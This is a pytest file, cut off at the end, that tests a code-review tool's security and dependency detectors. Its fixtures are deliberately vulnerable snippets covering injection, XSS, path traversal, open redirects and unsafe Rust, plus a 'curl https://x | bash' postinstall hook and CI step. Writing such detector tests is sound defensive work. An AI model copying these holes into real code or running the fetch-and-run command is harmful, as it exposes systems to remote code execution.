from types import SimpleNamespace

import pytest

from reviewforge.core.specs import build_registry
from reviewforge.core.state import ReviewTask, StateStore
from reviewforge.engine.detectors import detect_dependency_findings, detect_security_findings
from reviewforge.engine.detectors.security import (
    is_auto_confirmable_security_finding,
    is_deterministic_security_finding,
)
from reviewforge.engine.reviewers import SecurityReviewer
from reviewforge.tools.gateway import ToolGateway


def _diff(content: str) -> str:
    lines = content.splitlines()
    return f"@@ -0,0 +1,{len(lines)} @@\n" + "\n".join("+" + line for line in lines)


def _cats(findings):
    return {f.category for f in findings}


def test_security_detector_covers_core_languages():
    findings = detect_security_findings(
        {
            "app.py": _diff('query = f"SELECT * FROM users WHERE id = {user_id}"\nreturn pickle.loads(blob)'),
            "web.js": _diff("eval(input)\ndocument.body.innerHTML = input\nchild_process.exec(cmd)"),
            "cmp.ts": _diff("sanitizer.bypassSecurityTrustHtml(html)\nsessionStorage.setItem('token', token)"),
            "view.vue": _diff('<div v-html="bio"></div>\n<component :is="name" />'),
            "view.svelte": _diff("<script>console.log(document.cookie)</script>\n<div>{@html html}</div>"),
            "main.go": _diff('query := fmt.Sprintf("SELECT * FROM users WHERE id=%s", id)\nexec.Command(cmd)'),
            "User.java": _diff("Runtime.getRuntime().exec(cmd)\nStatement stmt = c.createStatement();"),
            "pay.rb": _diff('eval(params[:code])\nsystem("notify #{email}")\nMarshal.load(raw)'),
            "lib.rs": _diff("Command::new(cmd).output().unwrap()\nunsafe { std::mem::transmute::<[u8; 4], u32>(buf) }"),
            "raw.rs": _diff("pub unsafe fn read(ptr: *const u8) -> u8 { *ptr }"),
        }
    )

    assert {
        "sql-injection",
        "insecure-deserialization",
        "code-injection",
        "xss",
        "command-injection",
        "xss-bypass",
        "data-leak",
        "unsafe-block",
        "unsafe-transmute",
    } <= _cats(findings)

    rust_findings = [finding for finding in findings if finding.file == "lib.rs"]
    assert all(finding.category != "unsafe-usage" for finding in rust_findings)
    assert [finding.category for finding in rust_findings].count("unsafe-transmute") == 1
    assert all(finding.category != "unsafe-block" for finding in rust_findings)
    raw_unsafe = next(
        finding for finding in findings if finding.file == "raw.rs" and finding.category == "unsafe-block"
    )
    assert raw_unsafe.confidence >= 0.96
    assert "public unsafe function" in raw_unsafe.message.lower()
    assert "# Safety" in raw_unsafe.message


def test_rust_unsafe_detector_distinguishes_public_contract_and_local_scope_evidence():
    findings = detect_security_findings(
        {
            "documented.rs": _diff(
                "/// # Safety\n"
                "/// `ptr` must be non-null, aligned, and readable.\n"
                "pub unsafe fn raw_read(ptr: *const u8) -> u8 { *ptr }"
            ),
            "scoped.rs": _diff("fn read(ptr: *const u8) -> u8 {\n    unsafe { *ptr }\n}"),
        }
    )

    assert all(finding.file != "documented.rs" for finding in findings if finding.category == "unsafe-block")
    scoped = next(finding for finding in findings if finding.file == "scoped.rs" and finding.category == "unsafe-block")
    assert "unsafe block" in scoped.message.lower()
    assert "SAFETY:" in scoped.message


def test_svelte_raw_html_directive_is_code_but_comment_and_string_decoys_are_not():
    findings = detect_security_findings(
        {
            "raw.svelte": _diff(
                "<p>{@html userHtml}</p>\n"
                "<!-- <p>{@html ignoredComment}</p> -->\n"
                "<script>const text = '{@html ignoredString}'</script>"
            )
        }
    )

    assert [finding.line for finding in findings if finding.category == "xss"] == [1]


def test_java_fixed_runtime_exec_is_not_command_injection():
    findings = detect_security_findings(
        {
            "Safe.java": _diff(
                'Runtime.getRuntime().exec(new String[]{"/usr/bin/true"});\nRuntime.getRuntime().exec("/usr/bin/true");'
            ),
            "Dynamic.java": _diff("Runtime.getRuntime().exec(command);"),
        }
    )

    commands = [finding for finding in findings if finding.category == "command-injection"]
    assert [(finding.file, finding.line) for finding in commands] == [("Dynamic.java", 1)]


def test_rust_unwrap_is_not_mislabeled_as_unsafe_security_usage():
    findings = detect_security_findings({"lib.rs": _diff("let value = result.unwrap();")})

    assert findings == []


def test_rust_command_detector_requires_parameter_to_select_executable():
    findings = detect_security_findings(
        {
            "dynamic.rs": _diff(
                "use std::process::Command;\n"
                "pub fn execute_hook(hook_name: &str) -> std::io::Result<()> {\n"
                "    let program = hook_name.trim();\n"
                '    Command::new(program).arg("--check").status()?;\n'
                "    Ok(())\n"
                "}"
            ),
            "fixed.rs": _diff(
                "use std::process::Command;\n"
                "pub fn inspect(user_arg: &str) -> std::io::Result<()> {\n"
                '    Command::new("/usr/bin/git").arg(user_arg).status()?;\n'
                "    Ok(())\n"
                "}"
            ),
            "multiline.rs": _diff(
                "use std::process::Command;\n"
                "pub fn execute_hook(hook_name: &str) -> std::io::Result<()> {\n"
                "    Command::new(\n"
                "        hook_name.trim(),\n"
                "    ).status()?;\n"
                "    Ok(())\n"
                "}"
            ),
            "private_fixed.rs": _diff(
                "use std::process::Command;\n"
                "fn fixed_helper(program: &str) -> std::io::Result<()> {\n"
                "    Command::new(program).status()?;\n"
                "    Ok(())\n"
                "}\n"
                "fn main() -> std::io::Result<()> {\n"
                '    fixed_helper("/usr/bin/git")\n'
                "}"
            ),
        }
    )

    commands = [finding for finding in findings if finding.category == "command-injection"]
    assert [(finding.file, finding.line) for finding in commands] == [
        ("dynamic.rs", 4),
        ("multiline.rs", 3),
    ]
    assert all("hook_name" in finding.message or "program" in finding.message for finding in commands)
    assert all(finding.confidence >= 0.96 for finding in commands)


def test_rust_path_detector_requires_dynamic_construction_or_request_provenance():
    findings = detect_security_findings(
        {
            "direct.rs": _diff(
                "use std::fs;\n"
                "pub fn load_config(path: &str) -> Result<String, std::io::Error> {\n"
                "    fs::read_to_string(path)\n"
                "}"
            ),
            "dynamic.rs": _diff(
                "use std::fs;\n"
                "pub fn load(base: &str, filename: &str) -> Result<String, std::io::Error> {\n"
                '    let path = format!("{}/{}", base, filename);\n'
                "    fs::read_to_string(&path)\n"
                "}"
            ),
            "joined.rs": _diff(
                "use std::fs;\n"
                "pub fn load(base: &Path, filename: &str) -> Result<Vec<u8>, std::io::Error> {\n"
                "    let candidate = base.join(filename);\n"
                "    fs::read(&candidate)\n"
                "}"
            ),
            "guarded.rs": _diff(
                "use std::fs;\n"
                "pub fn load(base: &Path, filename: &str) -> Result<Vec<u8>, std::io::Error> {\n"
                "    let candidate = base.join(filename).canonicalize()?;\n"
                "    if !candidate.starts_with(base) { return Err(std::io::ErrorKind::InvalidInput.into()); }\n"
                "    fs::read(&candidate)\n"
                "}"
            ),
        }
    )

    paths = [finding for finding in findings if finding.category == "path-traversal"]
    assert {(finding.file, finding.line) for finding in paths} == {("dynamic.rs", 4), ("joined.rs", 4)}
    assert all(finding.confidence >= 0.96 for finding in paths)
    assert all("parameter" in finding.message and "filesystem read" in finding.message for finding in paths)


def test_high_signal_browser_storage_raw_html_and_ruby_backticks_are_detector_auto_quality():
    findings = detect_security_findings(
        {
            "storage.tsx": _diff(
                'localStorage.setItem("token", token)\n'
                'localStorage.setItem("token", "cleared")\n'
                'localStorage.setItem("last-token-check", "done")\n'
                "const html = response.data.html\n"
                "return <article dangerouslySetInnerHTML={{ __html: html }} />\n"
                "return <article dangerouslySetInnerHTML={{ __html: sanitizedHtml }} />"
            ),
            "command.rb": _diff("`echo #{user_input}`\n`echo fixed`"),
        }
    )

    storage = [finding for finding in findings if finding.file == "storage.tsx"]
    raw_token = next(finding for finding in storage if finding.category == "data-leak" and finding.line == 1)
    cleared_token = next(finding for finding in storage if finding.category == "data-leak" and finding.line == 2)
    raw_html = next(finding for finding in storage if finding.category == "xss" and finding.line == 5)
    sanitized_html = next(finding for finding in storage if finding.category == "xss" and finding.line == 6)
    dynamic_backtick = next(finding for finding in findings if finding.file == "command.rb" and finding.line == 1)
    constant_backtick = next(finding for finding in findings if finding.file == "command.rb" and finding.line == 2)

    assert raw_token.confidence >= 0.96
    assert cleared_token.confidence < 0.96
    assert raw_html.confidence >= 0.96
    assert sanitized_html.confidence < 0.96
    assert dynamic_backtick.confidence >= 0.96
    assert constant_backtick.confidence < 0.96


def test_security_auto_confirm_allows_only_dynamic_values_under_explicit_browser_credential_keys():
    patch = _diff(
        "export function storeToken(token: string) {\n"
        '  localStorage.setItem("token", token)\n'
        "}\n"
        'const loggedOut = "logged-out"\n'
        'localStorage.setItem("token", loggedOut)\n'
        'localStorage.setItem("token", "cleared")\n'
        'localStorage.setItem("last-token-check", token)\n'
        'localStorage.setItem("token", response.data.token)'
    )

    findings = [
        finding for finding in detect_security_findings({"storage.tsx": patch}) if finding.category == "data-leak"
    ]

    assert next(finding for finding in findings if finding.line == 2).confidence == 0.96
    assert is_auto_confirmable_security_finding("storage.tsx", 2, "data-leak", patch)
    assert all(
        not is_auto_confirmable_security_finding("storage.tsx", line, "data-leak", patch) for line in (5, 6, 7, 8)
    )
    assert not is_auto_confirmable_security_finding("tests/storage.tsx", 2, "data-leak", patch)
    assert not is_auto_confirmable_security_finding(
        "storage.tsx",
        2,
        "data-leak",
        '@@ -2,1 +2,1 @@\n-  localStorage.removeItem("token")\n+  localStorage.setItem("token", token)',
    )


def test_browser_storage_static_nullable_and_logout_values_are_contextual():
    findings = detect_security_findings(
        {
            "logout.ts": _diff(
                "const token = 'logged-out';\n"
                "let password: string | null = null;\n"
                "localStorage.setItem('token', token);\n"
                "sessionStorage.setItem('password', password);\n"
                "localStorage.setItem('token', response.data.token);"
            )
        }
    )

    storage = {finding.line: finding.confidence for finding in findings if finding.category == "data-leak"}
    assert storage[3] < 0.96
    assert storage[4] < 0.96
    # The current high-signal rule intentionally accepts only a simple value
    # identifier; property expressions remain contextual rather than being
    # promoted from their name alone.
    assert storage[5] < 0.96


def test_high_confidence_html_and_ruby_rules_trace_explicit_sanitizers():
    findings = detect_security_findings(
        {
            "safe.tsx": _diff(
                "const html = DOMPurify.sanitize(userHtml);\n"
                "return <article dangerouslySetInnerHTML={{ __html: html }} />;"
            ),
            "safe.rb": _diff(
                "escaped = Shellwords.escape(user_input)\n`echo #{escaped}`\n`echo #{Shellwords.escape(other_input)}`"
            ),
        }
    )

    relevant = [finding for finding in findings if finding.category in {"xss", "command-injection"}]
    assert {(finding.file, finding.line) for finding in relevant} == {
        ("safe.tsx", 2),
        ("safe.rb", 2),
        ("safe.rb", 3),
    }
    assert all(finding.confidence < 0.96 for finding in relevant)


def test_high_confidence_html_and_ruby_rules_do_not_auto_confirm_static_or_scalar_values():
    findings = detect_security_findings(
        {
            "safe.tsx": _diff(
                'const html = "<strong>Service status</strong>";\n'
                "return <article dangerouslySetInnerHTML={{ __html: html }} />;\n"
                "const cleaned = sanitizeHtml(userHtml);\n"
                "return <article dangerouslySetInnerHTML={{ __html: cleaned }} />;"
            ),
            "safe.rb": _diff(
                "count = 7\nsafe_name = 'daily-report'\n`echo #{count}`\n`echo #{safe_name}`\n`echo #{user_input}`"
            ),
        }
    )

    relevant = [finding for finding in findings if finding.category in {"xss", "command-injection"}]
    by_location = {(finding.file, finding.line): finding.confidence for finding in relevant}
    assert by_location[("safe.tsx", 2)] < 0.96
    assert by_location[("safe.tsx", 4)] < 0.96
    assert by_location[("safe.rb", 3)] < 0.96
    assert by_location[("safe.rb", 4)] < 0.96
    assert by_location[("safe.rb", 5)] >= 0.96


def test_raw_html_requires_strong_source_and_ruby_fixed_scalars_are_contextual():
    findings = detect_security_findings(
        {
            "html.tsx": _diff(
                "const SAFE_HTML = '<strong>ready</strong>';\n"
                "const networkHtml = response.data.html;\n"
                "return <div dangerouslySetInnerHTML={{ __html: SAFE_HTML }} />;\n"
                "return <div dangerouslySetInnerHTML={{ __html: props.safeHtml }} />;\n"
                "return <div dangerouslySetInnerHTML={{ __html: networkHtml }} />;\n"
                "return <div dangerouslySetInnerHTML={{ __html: html }} />;"
            ),
            "scalar.rb": _diff(
                "count = -1\nstate = :ready\n`echo #{count}`\n`echo #{state}`\n`echo #{'fixed'}`\n`echo #{user_input}`"
            ),
        }
    )

    confidence = {
        (finding.file, finding.line): finding.confidence
        for finding in findings
        if finding.category in {"xss", "command-injection"}
    }
    assert confidence[("html.tsx", 3)] < 0.96
    assert confidence[("html.tsx", 4)] < 0.96
    assert confidence[("html.tsx", 5)] >= 0.96
    assert confidence[("html.tsx", 6)] < 0.96
    assert confidence[("scalar.rb", 3)] < 0.96
    assert confidence[("scalar.rb", 4)] < 0.96
    assert confidence[("scalar.rb", 5)] < 0.96
    assert confidence[("scalar.rb", 6)] >= 0.96


def test_raw_html_function_parameter_is_high_signal_but_safe_named_prop_is_contextual():
    findings = detect_security_findings(
        {
            "preview.tsx": _diff(
                "export function HtmlPreview({ html }: { html: string }) {\n"
                "  return <div dangerouslySetInnerHTML={{ __html: html }} />;\n"
                "}\n"
                "export function TrustedPreview({ safeHtml }: { safeHtml: string }) {\n"
                "  return <div dangerouslySetInnerHTML={{ __html: safeHtml }} />;\n"
                "}"
            )
        }
    )

    xss = {finding.line: finding.confidence for finding in findings if finding.category == "xss"}
    assert xss[2] >= 0.96
    assert xss[5] < 0.96


def test_raw_html_static_default_and_trusted_type_are_not_auto_signal():
    findings = detect_security_findings(
        {
            "default.tsx": _diff(
                'export function Preview({ html = "<strong>safe</strong>" }) {\n'
                "  return <div dangerouslySetInnerHTML={{ __html: html }} />;\n"
                "}"
            ),
            "trusted.tsx": _diff(
                "export function Preview(html: TrustedHTML) {\n"
                "  return <div dangerouslySetInnerHTML={{ __html: html }} />;\n"
                "}"
            ),
            "ordinary-default.tsx": _diff(
                'export function Preview(html = "<strong>safe</strong>") {\n'
                "  return <div dangerouslySetInnerHTML={{ __html: html }} />;\n"
                "}"
            ),
            "arrow-default.tsx": _diff(
                'export const Preview = (html = "<strong>safe</strong>") => {\n'
                "  return <div dangerouslySetInnerHTML={{ __html: html }} />;\n"
                "}"
            ),
            "trusted-global.tsx": _diff(
                "export function Preview(html: globalThis.TrustedHTML) {\n"
                "  return <div dangerouslySetInnerHTML={{ __html: html }} />;\n"
                "}"
            ),
            "parenthesized-default.tsx": _diff(
                'export function Preview(html = ("<strong>safe</strong>")) {\n'
                "  return <div dangerouslySetInnerHTML={{ __html: html }} />;\n"
                "}"
            ),
            "untrusted.tsx": _diff(
                "export function Preview(html: UntrustedHTML) {\n"
                "  return <div dangerouslySetInnerHTML={{ __html: html }} />;\n"
                "}"
            ),
            "unsafe.tsx": _diff(
                "export function Preview(html: UnsafeHTML) {\n"
                "  return <div dangerouslySetInnerHTML={{ __html: html }} />;\n"
                "}"
            ),
            "trusted-union.tsx": _diff(
                "export function Preview(html: TrustedHTML | string) {\n"
                "  return <div dangerouslySetInnerHTML={{ __html: html }} />;\n"
                "}"
            ),
            "neighbor-default.tsx": _diff(
                'export function Preview(html: string, mode = "compact") {\n'
                "  return <div dangerouslySetInnerHTML={{ __html: html }} />;\n"
                "}"
            ),
            "trusted-neighbor-union.tsx": _diff(
                'export function Preview(html: TrustedHTML, mode: "a" | "b") {\n'
                "  return <div dangerouslySetInnerHTML={{ __html: html }} />;\n"
                "}"
            ),
            "destructured-whole-default.tsx": _diff(
                'export function Preview({ html }: { html: string } = { html: "<b>safe</b>" }) {\n'
                "  return <div dangerouslySetInnerHTML={{ __html: html }} />;\n"
                "}"
            ),
        }
    )

    confidence = {(finding.file, finding.line): finding.confidence for finding in findings if finding.category == "xss"}
    assert confidence[("default.tsx", 2)] < 0.96
    assert confidence[("trusted.tsx", 2)] < 0.96
    assert confidence[("ordinary-default.tsx", 2)] < 0.96
    assert confidence[("arrow-default.tsx", 2)] < 0.96
    assert confidence[("trusted-global.tsx", 2)] < 0.96
    assert confidence[("parenthesized-default.tsx", 2)] < 0.96
    assert confidence[("untrusted.tsx", 2)] >= 0.96
    assert confidence[("unsafe.tsx", 2)] >= 0.96
    assert confidence[("trusted-union.tsx", 2)] >= 0.96
    assert confidence[("neighbor-default.tsx", 2)] >= 0.96
    assert confidence[("trusted-neighbor-union.tsx", 2)] < 0.96
    assert confidence[("destructured-whole-default.tsx", 2)] < 0.96


def test_rust_path_detector_distinguishes_internal_constants_and_axum_extractors():
    findings = detect_security_findings(
        {
            "constant.rs": _diff(
                'const FILE_NAME: &str = "config.toml";\n'
                "pub fn load(base: &Path) -> Result<Vec<u8>, std::io::Error> {\n"
                "    let candidate = base.join(FILE_NAME);\n"
                "    fs::read(&candidate)\n"
                "}"
            ),
            "handler.rs": _diff(
                "async fn download(Path(filename): Path<String>) -> Result<Vec<u8>, Error> {\n"
                "    fs::read(filename).map_err(Error::from)\n"
                "}"
            ),
        }
    )

    paths = [finding for finding in findings if finding.category == "path-traversal"]
    assert [(finding.file, finding.line) for finding in paths] == [("handler.rs", 2)]
    assert paths[0].confidence >= 0.96


def test_rust_path_guard_must_constrain_same_candidate_before_sink():
    findings = detect_security_findings(
        {
            "guarded.rs": _diff(
                "pub fn load(base: &Path, filename: &str) -> Result<Vec<u8>, Error> {\n"
                "    let candidate = base.join(filename).canonicalize()?;\n"
                "    if !candidate.starts_with(base) { return Err(Error::Traversal); }\n"
                "    fs::read(&candidate).map_err(Error::from)\n"
                "}"
            ),
            "late.rs": _diff(
                "pub fn load(base: &Path, filename: &str) -> Result<Vec<u8>, Error> {\n"
                "    let candidate = base.join(filename).canonicalize()?;\n"
                "    let content = fs::read(&candidate)?;\n"
                "    if !candidate.starts_with(base) { return Err(Error::Traversal); }\n"
                "    Ok(content)\n"
                "}"
            ),
            "unrelated.rs": _diff(
                "pub fn load(base: &Path, filename: &str) -> Result<Vec<u8>, Error> {\n"
                "    let candidate = base.join(filename).canonicalize()?;\n"
                '    let safe = base.join("known.txt").canonicalize()?;\n'
                "    if !safe.starts_with(base) { return Err(Error::Traversal); }\n"
                "    fs::read(&candidate).map_err(Error::from)\n"
                "}"
            ),
        }
    )

    paths = {(finding.file, finding.line) for finding in findings if finding.category == "path-traversal"}
    assert paths == {("late.rs", 3), ("unrelated.rs", 5)}


def test_rust_path_detector_accepts_dominating_branches_and_actix_request_sources():
    findings = detect_security_findings(
        {
            "positive.rs": _diff(
                "fn load(base: &Path, filename: &str) -> Result<Vec<u8>, Error> {\n"
                "    let candidate = base.join(filename).canonicalize()?;\n"
                "    if candidate.starts_with(base) {\n"
                "        return fs::read(&candidate).map_err(Error::from);\n"
                "    }\n"
                "    Err(Error::Traversal)\n"
                "}"
            ),
            "strip.rs": _diff(
                "fn load(base: &Path, filename: &str) -> Result<Vec<u8>, Error> {\n"
                "    let candidate = base.join(filename);\n"
                "    if candidate.strip_prefix(base).is_err() { return Err(Error::Traversal); }\n"
                "    fs::read(&candidate).map_err(Error::from)\n"
                "}"
            ),
            "actix.rs": _diff(
                "async fn download(web::Path(filename): web::Path<String>) -> Result<Vec<u8>, Error> {\n"
                "    fs::read(filename).map_err(Error::from)\n"
                "}"
            ),
        }
    )

    paths = [finding for finding in findings if finding.category == "path-traversal"]
    assert [(finding.file, finding.line) for finding in paths] == [("strip.rs", 4), ("actix.rs", 2)]
    assert all(finding.confidence >= 0.96 for finding in paths)


def test_rust_existing_handler_context_and_balanced_sink_do_not_cross_functions():
    findings = detect_security_findings(
        {
            "existing.rs": (
                "@@ -10,2 +10,3 @@\n"
                " async fn download(Path(filename): Path<String>) -> Result<Vec<u8>, Error> {\n"
                '+    fs::read(Path::new("/srv/files").join(filename)).map_err(Error::from)\n'
                " }"
            ),
            "separate.rs": (
                "@@ -1,5 +1,6 @@\n"
                " async fn request_handler(Path(filename): Path<String>) {\n"
                "     consume(filename);\n"
                " }\n"
                " fn internal(filename: &str) -> Result<Vec<u8>, Error> {\n"
                "+    fs::read(filename).map_err(Error::from)\n"
                " }"
            ),
        }
    )

    paths = [(finding.file, finding.line) for finding in findings if finding.category == "path-traversal"]
    assert paths == [("existing.rs", 11)]


def test_rust_existing_handler_without_signature_keeps_inline_sink_contextual():
    findings = detect_security_findings(
        {
            "existing.rs": (
                "@@ -97,6 +97,7 @@\n"
                "     audit_download(filename);\n"
                '     let base = Path::new("/srv/files");\n'
                "     metrics.increment();\n"
                "+    fs::read(base.join(filename)).map_err(Error::from)\n"
                "     finalize();\n"
                " }"
            ),
            "fixed.rs": (
                "@@ -40,3 +40,5 @@\n"
                "     metrics.increment();\n"
                '+    fs::read(base.join("known.txt"))?;\n'
                '+    fs::read(format!("/srv/files/config.json"))?;\n'
                "     finalize();"
            ),
        }
    )

    paths = [finding for finding in findings if finding.category == "path-traversal"]
    assert [(finding.file, finding.line) for finding in paths] == [("existing.rs", 100)]
    assert paths[0].confidence < 0.96


def test_rust_strip_prefix_needs_canonicalization_and_guard_local_termination():
    findings = detect_security_findings(
        {
            "canonical_strip.rs": _diff(
                "fn load(base: &Path, filename: &str) -> Result<Vec<u8>, Error> {\n"
                "    let candidate = base.join(filename).canonicalize()?;\n"
                "    if candidate.strip_prefix(base).is_err() { return Err(Error::Traversal); }\n"
                "    fs::read(&candidate).map_err(Error::from)\n"
                "}"
            ),
            "unrelated_return.rs": _diff(
                "fn load(base: &Path, filename: &str, stop: bool) -> Result<Vec<u8>, Error> {\n"
                "    let candidate = base.join(filename).canonicalize()?;\n"
                "    if !candidate.starts_with(base) { audit(&candidate); }\n"
                "    if stop { return Err(Error::Stopped); }\n"
                "    fs::read(&candidate).map_err(Error::from)\n"
                "}"
            ),
        }
    )

    paths = [(finding.file, finding.line) for finding in findings if finding.category == "path-traversal"]
    assert paths == [("unrelated_return.rs", 5)]


def test_browser_redirect_detector_requires_a_dynamic_destination():
    findings = detect_security_findings(
        {
            "view.jsx": _diff(
                "window.location.href = next;\n"
                "window.location = '/account';\n"
                'window.location.href = "https://example.invalid/help";'
            ),
            "view.vue": _diff("window.location.href = target"),
            "safe.tsx": _diff(
                "function go(url: string) {\n"
                "  const allowed = ['/home', '/settings'];\n"
                "  if (allowed.includes(url)) {\n"
                "    window.location.href = url;\n"
                "  }\n"
                "}"
            ),
        }
    )

    redirects = [finding for finding in findings if finding.category == "open-redirect"]
    assert {(finding.file, finding.line) for finding in redirects} == {("view.jsx", 1), ("view.vue", 1)}
    assert all(finding.confidence >= 0.96 for finding in redirects)


def test_browser_redirect_detector_keeps_jsx_event_handler_code():
    findings = detect_security_findings(
        {
            "view.jsx": _diff(
                "export function Continue({ next }) {\n"
                "  return <button onClick={() => (window.location.href = next)}>continue</button>;\n"
                "}"
            )
        }
    )

    redirects = [finding for finding in findings if finding.category == "open-redirect"]
    assert [(finding.file, finding.line) for finding in redirects] == [("view.jsx", 2)]


def test_rust_safety_comment_suppresses_generic_unsafe_audit_but_undocumented_unsafe_remains():
    findings = detect_security_findings(
        {
            "safe.rs": _diff(
                "pub fn read(data: &[u8; 4]) -> u32 {\n"
                "    // SAFETY: the four initialized bytes are valid for this unaligned read.\n"
                "    unsafe { std::ptr::read_unaligned(data.as_ptr().cast::<u32>()) }\n"
                "}"
            ),
            "unsafe.rs": _diff("pub unsafe fn read(ptr: *const u8) -> u8 {\n    *ptr\n}"),
        }
    )

    unsafe_blocks = [finding for finding in findings if finding.category == "unsafe-block"]
    assert [(finding.file, finding.line) for finding in unsafe_blocks] == [("unsafe.rs", 1)]


def test_ruby_direct_request_path_reaching_file_read_is_detected():
    findings = detect_security_findings(
        {
            "loader.rb": _diff(
                "safe = File.read('/srv/config.yml')\nunsafe = YAML.load(File.read(user_input[:config_path]))"
            )
        }
    )

    assert ("loader.rb", 2, "path-traversal") in {
        (finding.file, finding.line, finding.category) for finding in findings
    }


def test_python_request_path_builder_reaching_open_is_detected_but_basename_is_clean():
    findings = detect_security_findings(
        {
            "loader.py": _diff(
                "import os\n"
                "def load(filename):\n"
                "    path = os.path.join('/srv/data', filename)\n"
                "    with open(path) as handle:\n"
                "        return handle.read()"
            ),
            "safe_loader.py": _diff(
                "import os\n"
                "def load(filename):\n"
                "    safe_name = os.path.basename(filename)\n"
                "    path = os.path.join('/srv/data', safe_name)\n"
                "    with open(path) as handle:\n"
                "        return handle.read()"
            ),
            "path_loader.py": _diff(
                "from pathlib import Path\n"
                "def load(filename):\n"
                "    path = Path('/srv/data') / filename\n"
                "    return path.read_text()"
            ),
        }
    )

    traversal = [finding for finding in findings if finding.category == "path-traversal"]
    assert {(finding.file, finding.line) for finding in traversal} == {
        ("loader.py", 4),
        ("path_loader.py", 4),
    }
    assert all(finding.confidence >= 0.96 for finding in traversal)


def test_python_redirect_helper_requires_destination_validation():
    findings = detect_security_findings(
        {
            "redirects.py": _diff(
                "def build_redirect_url(next_url: str) -> str:\n"
                "    return next_url\n"
                "\n"
                "def unsafe_redirect(next_url: str):\n"
                "    return redirect(next_url)\n"
                "\n"
                "def safe_redirect(next_url: str):\n"
                "    if next_url.startswith('/') and not next_url.startswith('//'):\n"
                "        return redirect(next_url)\n"
                "    return redirect('/home')\n"
                "\n"
                "def validated_redirect(next_url: str):\n"
                "    parsed = urlparse(next_url)\n"
                "    if parsed.netloc or not parsed.path.startswith('/app/'):\n"
                "        return RedirectResponse('/app/home')\n"
                "    return RedirectResponse(next_url)\n"
                "\n"
                "def redirect_destination(next_url: str) -> str:\n"
                "    return next_url"
            )
        }
    )

    redirects = [finding for finding in findings if finding.category == "open-redirect"]
    assert [(finding.file, finding.line) for finding in redirects] == [("redirects.py", 5)]
    assert redirects[0].confidence >= 0.96


def test_python_url_builder_without_redirect_sink_is_not_an_open_redirect():
    findings = detect_security_findings(
        {"seed_sinks.py": _diff("def build_redirect_url(next_url: str) -> str:\n    return next_url")}
    )

    assert not [finding for finding in findings if finding.category == "open-redirect"]


def test_python_redirect_guard_must_dominate_sink_and_parameter_name_is_irrelevant():
    findings = detect_security_findings(
        {
            "redirect_flow.py": _diff(
                "def unsafe(path):\n"
                "    return redirect(path)\n"
                "\n"
                "def guard_after_sink(path):\n"
                "    response = RedirectResponse(path)\n"
                "    if path.startswith('/'):\n"
                "        return response\n"
                "    return RedirectResponse('/home')\n"
                "\n"
                "def unrelated_guard(path, other):\n"
                "    if other.startswith('/'):\n"
                "        audit(other)\n"
                "    return redirect(path)\n"
                "\n"
                "def dominated(path):\n"
                "    if not path.startswith('/') or path.startswith('//'):\n"
                "        return redirect('/home')\n"
                "    return redirect(path)\n"
                "\n"
                "def value_only(path):\n"
                "    return path"
            )
        }
    )

    redirects = [finding for finding in findings if finding.category == "open-redirect"]
    assert [(finding.file, finding.line) for finding in redirects] == [
        ("redirect_flow.py", 2),
        ("redirect_flow.py", 5),
        ("redirect_flow.py", 13),
    ]
    assert all(finding.confidence >= 0.96 for finding in redirects)


def test_python_redirect_requires_local_guard_and_supports_keyword_destination():
    findings = detect_security_findings(
        {
            "slash.py": _diff(
                "def go(target):\n"
                "    if target.startswith('/'):\n"
                "        return redirect(target)\n"
                "    return redirect('/home')"
            ),
            "arbitrary.py": _diff(
                "def go(target):\n"
                "    if target.startswith('https'):\n"
                "        return RedirectResponse(url=target)\n"
                "    return RedirectResponse(url='/home')"
            ),
            "local.py": _diff(
                "def go(target):\n"
                "    if target.startswith('/') and not target.startswith('//'):\n"
                "        return RedirectResponse(url=target)\n"
                "    return RedirectResponse(url='/home')"
            ),
        }
    )

    redirects = [(finding.file, finding.line) for finding in findings if finding.category == "open-redirect"]
    assert redirects == [("slash.py", 3), ("arbitrary.py", 3)]


def test_dependency_detector_covers_manifests_and_ci_without_exact_pin_noise():
    findings = detect_dependency_findings(
        {
            "requirements.txt": _diff("requests==2.31.0\nflask>=2.0\nunsafe-lib==*"),
            "package.json": _diff('{"scripts":{"postinstall":"curl https://x | bash"},"dependencies":{"a":"^1.0.0"}}'),
            ".github/workflows/build.yml": _diff(
                "- uses: actions/checkout@main\n"
                "- uses: actions/setup-node@v4\n"
                "- run: curl https://x | bash\n"
                "- run: deploy ${{ github.event.pull_request.title }}"
            ),
        }
    )

    cats = _cats(findings)
    assert "dependency-version-range" in cats
    assert "supply-chain-risk" in cats
    assert "ci-security" in cats
    req_findings = [f for f in findings if f.file == "requirements.txt"]
    assert len([f for f in req_findings if f.category == "dependency-version-range"]) == 2


def test_dependency_detector_exactly_pinned_manifests_are_clean():
    sha = "a" * 40
    digest = "b" * 64
    findings = detect_dependency_findings(
        {
            "requirements.txt": _diff("requests==2.31.0"),
            "package.json": _diff('{"dependencies":{"react":"18.3.1"}}'),
            "pyproject.toml": _diff('requests = "==2.31.0"'),
            "go.mod": _diff("require example.com/lib v1.2.3"),
            "pom.xml": _diff("<dependency><version>1.2.3</version></dependency>"),
            "Gemfile": _diff('source "https://rubygems.org"\ngem "rack", "3.0.8"'),
            "Cargo.toml": _diff('[dependencies]\nserde = "=1.0.197"\nlegacy = "=0.8.1"'),
            ".github/workflows/build.yml": _diff(
                f"- uses: actions/checkout@{sha}\n- uses: docker://alpine@sha256:{digest}"
            ),
        }
    )

    assert findings == []


def test_dependency_detector_ignores_version_shapes_outside_dependency_declarations():
    digest = "c" * 64
    findings = detect_dependency_findings(
        {
            "pyproject.toml": _diff('requires-python = ">=3.11"'),
            "package.json": _diff('{"buildTarget":"latest"}'),
            "nested.package.json": _diff(
                '{\n  "tool": {\n    "dependencies": {\n      "mode": "latest"\n    }\n  }\n}'
            ),
            "requirements.txt": _diff("# supported versions: *"),
            "Cargo.toml": _diff('[package.metadata]\ncompatibility = ">=1.0"'),
            "metadata.Cargo.toml": _diff('[package.metadata.mytool.dependencies]\nthreshold = ">=1.0"'),
            "tool.pyproject.toml": _diff('[tool.my_linter.dependencies]\nthreshold = ">=1.0"'),
            "pom.xml": _diff("<project><version>1.0-SNAPSHOT</version></project>"),
            ".github/workflows/build.yml": _diff(f"- uses: docker://alpine@sha256:{digest}"),
        }
    )

    assert not [finding for finding in findings if finding.category == "dependency-version-range"]


def test_dependency_detector_masks_inactive_manifest_text_and_supports_cargo_workspace():
    findings = detect_dependency_findings(
        {
            "config/backup-package.json": _diff('{"dependencies":{"theme":"*"}}'),
            "config/notcargo.toml": _diff('[dependencies]\nserde = "*"'),
            "Gemfile": _diff(
                "DOC = <<~TEXT\n"
